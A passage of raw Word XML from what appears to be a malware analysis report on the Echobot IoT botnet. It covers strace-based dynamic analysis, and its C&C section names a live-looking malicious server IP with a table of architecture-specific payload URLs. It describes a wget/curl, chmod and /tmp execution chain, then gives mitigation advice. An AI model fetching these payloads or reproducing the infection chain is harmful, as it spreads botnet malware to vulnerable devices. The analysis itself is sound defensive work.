          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00256EBE">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Comparison of Owari STD Module and Echobot STD Module</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ECF0E53" w14:textId="2CD69B52" w:rsidR="00B8384C" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Using the command line tool strace and another python binary emulation tool to supplement our results named Zelos, we were able to analyze the dynamic behavior of the malware when executed, including network activity and system calls. </w:t>
      </w:r>
      <w:r w:rsidR="00E00E88">
        <w:t xml:space="preserve">After opening </w:t>
      </w:r>
      <w:r w:rsidR="00E00E88">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">/dev/watchdog </w:t>
      </w:r>
      <w:r w:rsidR="00E00E88">
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r w:rsidR="00E00E88">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/dev/misc/</w:t>
      </w:r>
      <w:r w:rsidR="00E00E88" w:rsidRPr="00E00E88">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>watchdog</w:t>
      </w:r>
      <w:r w:rsidR="00E00E88">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E00E88">
        <w:t xml:space="preserve">the malware will then use a socket to </w:t>
      </w:r>
      <w:r w:rsidR="005223EA">
        <w:t>attempt</w:t>
      </w:r>
      <w:r w:rsidR="00E00E88">
        <w:t xml:space="preserve"> a backdoor</w:t>
      </w:r>
      <w:r w:rsidR="00F449AC">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00E00E88">
        <w:t xml:space="preserve"> opening up</w:t>
      </w:r>
      <w:r w:rsidR="00621C71">
        <w:t xml:space="preserve"> UDP </w:t>
      </w:r>
      <w:r w:rsidR="00E00E88">
        <w:t>port 53</w:t>
      </w:r>
      <w:r w:rsidR="00A2238F">
        <w:t xml:space="preserve"> to establish a connection to</w:t>
      </w:r>
      <w:r w:rsidR="00F449AC">
        <w:t xml:space="preserve"> the google DNS server 8.8.8.8.</w:t>
      </w:r>
      <w:r w:rsidR="00A2238F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F449AC">
        <w:t xml:space="preserve">This is done to perform a DNS query for the C&amp;C domain and to get </w:t>
      </w:r>
      <w:r w:rsidR="00F74D76">
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00F449AC">
        <w:t xml:space="preserve"> corresponding IPv4 address back.</w:t>
      </w:r>
      <w:r w:rsidR="002407AD">
        <w:t xml:space="preserve"> Echobot will then open a random</w:t>
      </w:r>
      <w:r w:rsidR="00B8384C">
        <w:t xml:space="preserve"> TCP</w:t>
      </w:r>
      <w:r w:rsidR="002407AD">
        <w:t xml:space="preserve"> port such as 43891 to</w:t>
      </w:r>
      <w:r w:rsidR="008F5A03">
        <w:t xml:space="preserve"> the</w:t>
      </w:r>
      <w:r w:rsidR="003868F8">
        <w:t xml:space="preserve"> IP of our</w:t>
      </w:r>
      <w:r w:rsidR="008F5A03">
        <w:t xml:space="preserve"> IoT device</w:t>
      </w:r>
      <w:r w:rsidR="00214D89">
        <w:t xml:space="preserve"> (In this case, 10.0.2.15).</w:t>
      </w:r>
      <w:r w:rsidR="00F74D76">
        <w:t xml:space="preserve"> When Echobot succeeds it will finally close the </w:t>
      </w:r>
      <w:r w:rsidR="007B1FAE">
        <w:t>socket</w:t>
      </w:r>
      <w:r w:rsidR="00B820DB">
        <w:t xml:space="preserve"> and try to scan and infect other </w:t>
      </w:r>
      <w:r w:rsidR="00FE40F5">
        <w:t>vulnerable IoT devices on networks</w:t>
      </w:r>
      <w:r w:rsidR="007B1FAE">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE60170" w14:textId="57C58012" w:rsidR="002A0079" w:rsidRDefault="00B8384C" w:rsidP="002A0079">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="01E4E650" wp14:editId="1FDE3E43">
            <wp:extent cx="5943600" cy="2698213"/>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5" cstate="print">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect t="10033"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="2698213"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED214CF" w14:textId="1241C2AB" w:rsidR="002A0079" w:rsidRDefault="002A0079" w:rsidP="002A0079">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00610A70">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>DDoS Activity</w:t>
      </w:r>
      <w:r w:rsidR="00604BA0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> of Echobot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> captured via strace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B46A780" w14:textId="6C21B7F2" w:rsidR="00F71DCF" w:rsidRDefault="00F71DCF" w:rsidP="00F71DCF">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc101284338"/>
      <w:r w:rsidRPr="00F71DCF">
        <w:t>Command &amp; Control</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (C&amp;C)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="232845B8" w14:textId="5DBEE706" w:rsidR="00C423F8" w:rsidRDefault="00413A6D" w:rsidP="002E62FC">
      <w:r>
        <w:t>Thi</w:t>
      </w:r>
      <w:r w:rsidR="0023754B">
        <w:t xml:space="preserve">s malware sample was </w:t>
      </w:r>
      <w:r w:rsidR="009B3B4D">
        <w:t>hosted on a server with IP 80.82.67.184</w:t>
      </w:r>
      <w:r w:rsidR="00C650FB">
        <w:t xml:space="preserve"> alongside several other malicious samples.</w:t>
      </w:r>
      <w:r w:rsidR="00EF0AB2">
        <w:t xml:space="preserve"> It communicates to the server to fetch a malicious script called ‘</w:t>
      </w:r>
      <w:r w:rsidR="00EF0AB2" w:rsidRPr="00180E64">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Richard</w:t>
      </w:r>
      <w:r w:rsidR="00EF0AB2">
        <w:t xml:space="preserve">’ via </w:t>
      </w:r>
      <w:r w:rsidR="00EF0AB2" w:rsidRPr="00A80AB3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:r w:rsidR="008442A5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008442A5">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="008442A5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:r w:rsidR="00166A4B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00166A4B">
        <w:t>to download more payloads</w:t>
      </w:r>
      <w:r w:rsidR="00447746">
        <w:t xml:space="preserve"> hosted on the server</w:t>
      </w:r>
      <w:r w:rsidR="0071522F">
        <w:t xml:space="preserve"> depending on architecture</w:t>
      </w:r>
      <w:r w:rsidR="00EF0AB2">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00C650FB">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00702978">
        <w:t>The script will then give execution permission</w:t>
      </w:r>
      <w:r w:rsidR="00AC1111">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00702978">
        <w:t xml:space="preserve"> via the </w:t>
      </w:r>
      <w:r w:rsidR="00702978">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">chmod </w:t>
      </w:r>
      <w:r w:rsidR="00702978">
        <w:t xml:space="preserve">command such as </w:t>
      </w:r>
      <w:r w:rsidR="00702978">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">chmod +x </w:t>
      </w:r>
      <w:r w:rsidR="00702978">
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r w:rsidR="00702978">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>chmod 777</w:t>
      </w:r>
      <w:r w:rsidR="00534F59">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00534F59" w:rsidRPr="00534F59">
        <w:t xml:space="preserve">executing from the </w:t>
      </w:r>
      <w:r w:rsidR="00534F59" w:rsidRPr="00380D2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/tmp</w:t>
      </w:r>
      <w:r w:rsidR="00534F59" w:rsidRPr="00534F59">
        <w:t xml:space="preserve"> path to run more payloads and spread to other IoT devices with unpatched vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="008E6CE8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008E6CE8">
        <w:t>to be used in the Echobot botnet.</w:t>
      </w:r>
      <w:r w:rsidR="0006557B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="GridTable4-Accent1"/>
        <w:tblW w:w="3681" w:type="dxa"/>
        <w:tblInd w:w="2830" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3681"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B112E6" w14:paraId="3DBEFFE8" w14:textId="77777777" w:rsidTr="00BD63A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681" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A5E4662" w14:textId="460AA6A4" w:rsidR="00B112E6" w:rsidRDefault="00614C1B" w:rsidP="00BD63A0">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Files Hosted on 80.82.67.184</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="4CD6FF3E"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36C4D1B" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00660D08" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00660D08">
              <w:t>80.82.67.184/Richard</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="0A69D9A7"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F0ABFB8" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.arm</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="4A62D3BC"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19CF8D0C" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.arm4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="5A3629A5"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4C61ACFC" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.arm</w:t>
            </w:r>
            <w:r>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="749954E0"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AE88092" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.arm</w:t>
            </w:r>
            <w:r>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="4EF22C69"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95A0EAF" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.arm</w:t>
            </w:r>
            <w:r>
              <w:t>7</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="4DA0DEBA"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B9E9402" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.i486</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="5E136AF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F8D62C8" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.i686</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="5A6F39C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9FC9866" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:lastRenderedPageBreak/>
              <w:t>80.82.67.184/ECHOBOT.m68k</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="71A62800"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8084E06" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.mips</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="183EAD8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E597087" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.mips</w:t>
            </w:r>
            <w:r>
              <w:t>64</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="1F44EE6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7930C20" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.mpsl</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="56037E14"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27BE4C1" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.</w:t>
            </w:r>
            <w:r>
              <w:t>ppc</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="6A0BB21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F08A76C" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.</w:t>
            </w:r>
            <w:r>
              <w:t>sh4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="42FD35A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DBD51EF" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.</w:t>
            </w:r>
            <w:r>
              <w:t>spc</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="10E0179E"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6FF72B4" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.</w:t>
            </w:r>
            <w:r>
              <w:t>x86</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B112E6" w14:paraId="3B0A8A1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FF6D306" w14:textId="77777777" w:rsidR="00B112E6" w:rsidRPr="00C423F8" w:rsidRDefault="00B112E6" w:rsidP="00BD63A0">
            <w:r w:rsidRPr="00C423F8">
              <w:t>80.82.67.184/ECHOBOT.x86_64</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="21C0C107" w14:textId="1A10D839" w:rsidR="00D10983" w:rsidRDefault="00BE0373" w:rsidP="00D10983">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc101284339"/>
      <w:r w:rsidRPr="00BE0373">
        <w:t>Recommended Actions</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="1343BECD" w14:textId="0532A805" w:rsidR="00D10983" w:rsidRDefault="005E687F" w:rsidP="00D10983">
      <w:r>
        <w:t>Although it is impractical to manually block and react to most IoT botnet attacks</w:t>
      </w:r>
      <w:r w:rsidR="000C6499">
        <w:t xml:space="preserve"> since most botnet variants use well-known exploits to attack and compromise</w:t>
      </w:r>
      <w:r w:rsidR="00C10419">
        <w:t xml:space="preserve"> vulnerable outdated IoT devices</w:t>
      </w:r>
      <w:r>
        <w:t>, we can still try to prevent and mitigate</w:t>
      </w:r>
      <w:r w:rsidR="000C6499">
        <w:t xml:space="preserve"> the chance of</w:t>
      </w:r>
      <w:r w:rsidR="00C10419">
        <w:t xml:space="preserve"> our own</w:t>
      </w:r>
      <w:r w:rsidR="000C6499">
        <w:t xml:space="preserve"> IoT devices</w:t>
      </w:r>
      <w:r w:rsidR="00637461">
        <w:t xml:space="preserve"> including smart home devices</w:t>
      </w:r>
      <w:r w:rsidR="000C6499">
        <w:t xml:space="preserve"> being infected</w:t>
      </w:r>
      <w:r w:rsidR="00C10419">
        <w:t>. We can do this by:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B39E02E" w14:textId="5D7EC19A" w:rsidR="004A13D2" w:rsidRDefault="00C10419" w:rsidP="00C10419">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Updat</w:t>
      </w:r>
      <w:r w:rsidR="008E037E">
        <w:t>ing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IoT device firmware/software regularly</w:t>
      </w:r>
      <w:r w:rsidR="004A13D2">
        <w:t xml:space="preserve">. Many Botnet variants infect IoT devices </w:t>
      </w:r>
      <w:r w:rsidR="00051CD0">
        <w:t>that are unpatched.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10177884" w14:textId="46E657FB" w:rsidR="00C10419" w:rsidRDefault="004A13D2" w:rsidP="00C10419">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidR="00C10419">
        <w:t>ake sure access credentials</w:t>
      </w:r>
      <w:r w:rsidR="00B26B6C">
        <w:t xml:space="preserve"> for our own IoT devices</w:t>
      </w:r>
      <w:r w:rsidR="00C10419">
        <w:t xml:space="preserve"> are </w:t>
      </w:r>
      <w:r>
        <w:t>not default and are hardened to stop dictionary and brute force attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA3360E" w14:textId="3861AE83" w:rsidR="004A13D2" w:rsidRPr="00D10983" w:rsidRDefault="004A13D2" w:rsidP="00C10419">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Disable and stop using outdated </w:t>
      </w:r>
      <w:r w:rsidR="00725107">
        <w:t>IoT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> devices and equipment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B48E6B5" w14:textId="28F78C77" w:rsidR="00D37A0B" w:rsidRDefault="00EF3BB8" w:rsidP="00D37A0B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>If you have a</w:t>
      </w:r>
      <w:r w:rsidR="008E037E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>router, configure router settings to detect and deter intrusions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23CB7460" w14:textId="6A96B760" w:rsidR="00D37A0B" w:rsidRDefault="008E037E" w:rsidP="00D37A0B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Make sure IoT devices auto-update whenever possible</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3305BB76" w14:textId="1C5467E0" w:rsidR="008E037E" w:rsidRDefault="008E037E" w:rsidP="00D37A0B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use legitimate network IoT devices from trusted companies and stores</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3C52DA" w14:textId="04D7489F" w:rsidR="00D37A0B" w:rsidRDefault="006D18C9" w:rsidP="00D37A0B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Make sure IoT device traffic are encrypted when possible</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D8DCE10" w14:textId="03F0BA02" w:rsidR="003D7C34" w:rsidRDefault="00122E7F" w:rsidP="00122E7F">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc101284340"/>
      <w:r w:rsidRPr="00122E7F">
        <w:t>CONCLUSION</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="1F84C288" w14:textId="5D8013EC" w:rsidR="00122E7F" w:rsidRDefault="00D91614" w:rsidP="00122E7F">
      <w:r>
        <w:t>Echobot</w:t>
      </w:r>
      <w:r w:rsidR="0044631F">
        <w:t xml:space="preserve">, a successor to Mirai, </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">is a malicious malware that </w:t>
      </w:r>
      <w:r w:rsidR="0044631F">
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> infect multiple IoT devices</w:t>
      </w:r>
      <w:r w:rsidR="007B71F3">
        <w:t xml:space="preserve"> and transform </w:t>
      </w:r>
      <w:r w:rsidR="00886145">
        <w:t>devices</w:t>
      </w:r>
      <w:r w:rsidR="007B71F3">
        <w:t xml:space="preserve"> into bots </w:t>
      </w:r>
      <w:r w:rsidR="00886145">
        <w:t>that can be</w:t>
      </w:r>
      <w:r w:rsidR="007B71F3">
        <w:t xml:space="preserve"> controlled in a</w:t>
      </w:r>
      <w:r w:rsidR="00886145">
        <w:t>n attacker’s</w:t>
      </w:r>
      <w:r w:rsidR="007B71F3">
        <w:t xml:space="preserve"> botnet to perform largescale DDoS attacks</w:t>
      </w:r>
      <w:r w:rsidR="00470902">
        <w:t xml:space="preserve"> to disrupt services</w:t>
      </w:r>
      <w:r w:rsidR="0044631F">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6422B35F" w14:textId="643DFF96" w:rsidR="0044631F" w:rsidRDefault="00D86113" w:rsidP="00122E7F">
      <w:r>
        <w:t>Echobot is able to</w:t>
      </w:r>
      <w:r w:rsidR="0044631F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00363676">
        <w:t>scan</w:t>
      </w:r>
      <w:r w:rsidR="0044631F">
        <w:t xml:space="preserve"> for new IoT devices to infect</w:t>
      </w:r>
      <w:r w:rsidR="00363676">
        <w:t xml:space="preserve"> including routers, wireless IP cameras, NAS devices, cloud platforms, firewalls</w:t>
      </w:r>
      <w:r w:rsidR="00F167B9">
        <w:t>, smart home hubs</w:t>
      </w:r>
      <w:r w:rsidR="00363676">
        <w:t xml:space="preserve"> and much more by targeting new and old unpatched vulnerabilities in firmware.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> A leap from the default Mirai which used default credentials to spread to other infected devices.</w:t>
      </w:r>
      <w:r w:rsidR="00363676">
        <w:t xml:space="preserve"> With </w:t>
      </w:r>
      <w:r w:rsidR="001A6D11">
        <w:t>the Mirai source code being released</w:t>
      </w:r>
      <w:r w:rsidR="00187E65">
        <w:t xml:space="preserve"> in 2016</w:t>
      </w:r>
      <w:r w:rsidR="001A6D11">
        <w:t>, it is without a doubt that the IoT security landscape has</w:t>
      </w:r>
      <w:r w:rsidR="003F6025">
        <w:t xml:space="preserve"> changed dramatically and has</w:t>
      </w:r>
      <w:r w:rsidR="001A6D11">
        <w:t xml:space="preserve"> inspired new attacks and new threat actors to evolve </w:t>
      </w:r>
      <w:r w:rsidR="003F6025">
        <w:t>their</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> techniques</w:t>
      </w:r>
      <w:r w:rsidR="005A71B2">
        <w:t xml:space="preserve"> and malware</w:t>
      </w:r>
      <w:r w:rsidR="003F6025">
        <w:t xml:space="preserve"> to be a more serious threat to organizations</w:t>
      </w:r>
      <w:r w:rsidR="00187E65">
        <w:t>.</w:t>
      </w:r>
    </w:p>
